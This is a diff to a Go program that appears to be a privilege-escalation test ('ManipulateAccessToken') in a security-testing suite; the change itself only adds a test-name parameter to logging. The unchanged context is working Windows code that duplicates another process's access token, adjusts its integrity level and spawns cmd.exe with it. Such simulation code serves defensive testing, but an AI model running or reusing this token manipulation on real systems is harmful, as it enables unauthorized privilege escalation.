@@ -10,7 +10,7 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-func CheckPrivilegeEnabled(pidToDuplicate uint32, nameOfLogFile string) (bool, error) {
+func CheckPrivilegeEnabled(pidToDuplicate uint32, nameOfLogFile string, nameOfTest string) (bool, error) {
 	var tokenHandle windows.Token
 
 	proc, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, pidToDuplicate)
@@ -28,12 +28,12 @@ func CheckPrivilegeEnabled(pidToDuplicate uint32, nameOfLogFile string) (bool, e
 	var returnLength uint32
 	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &returnLength)
 	if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	}
 	buffer := make([]byte, returnLength)
 	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, &buffer[0], returnLength, &returnLength)
 	if err != nil {
-		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
 	}
 	privileges = *(*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))
 
@@ -57,8 +57,14 @@ type TOKEN_MANDATORY_LABEL struct {
 }
 
 func main() {
-	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "PrivEsc")
-	helpers.WriteLog(nameOfLogFile, "Starting Test: ManipulateAccessToken", 2)
+	var nameOfLogFile string
+	if len(os.Args) == 2 {
+		nameOfLogFile = os.Args[1]
+	} else {
+		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "PrivilegeEscalation", "PrivilegeEscalation")
+	}
+
+	helpers.WriteLog(nameOfLogFile, "Starting Test: ManipulateAccessToken", 2, "PrivilegeEscalation")
 	kernel := windows.NewLazyDLL("advapi32.dll")
 	setTok := kernel.NewProc("SetTokenInformation")
 	newProc := kernel.NewProc("CreateProcessWithTokenW")
@@ -73,7 +79,7 @@ func main() {
 	procs := processes[:numProcesses]
 	var pidToDup []uint32
 	for i := 0; i < len(procs); i++ {
-		if res, err := CheckPrivilegeEnabled(procs[i], nameOfLogFile); err == nil {
+		if res, err := CheckPrivilegeEnabled(procs[i], nameOfLogFile, "PrivilegeEscalation"); err == nil {
 			if res {
 				pidToDup = append(pidToDup, procs[i])
 			}
@@ -82,18 +88,18 @@ func main() {
 	for i := 0; i < len(pidToDup); i++ {
 		handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDup[i]))
 		if err != nil {
-			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
 		}
 
 		var tokTarg, dupTokHand windows.Token
 		err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
 		if err != nil {
-			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
 		}
 
 		err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
 		if err != nil {
-			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
+			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
 		}
 
 		var tml TOKEN_MANDATORY_LABEL
@@ -105,7 +111,7 @@ func main() {
 		_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
 		if err != nil {
 			if err.Error() != "The operation completed successfully." {
-				helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
+				helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1, "PrivilegeEscalation")
 				continue
 			}
 		}
@@ -115,12 +121,12 @@ func main() {
 
 		_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
 		if err != nil {
-			helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
+			helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1, "PrivilegeEscalation")
 		} else {
 			os.Exit(0)
 		}
 	}
-	helpers.WriteLog(nameOfLogFile, "Ending Test: ManipulateAccessToken", 2)
+	helpers.WriteLog(nameOfLogFile, "Ending Test: ManipulateAccessToken", 2, "PrivilegeEscalation")
 	os.Exit(1)
 }
 
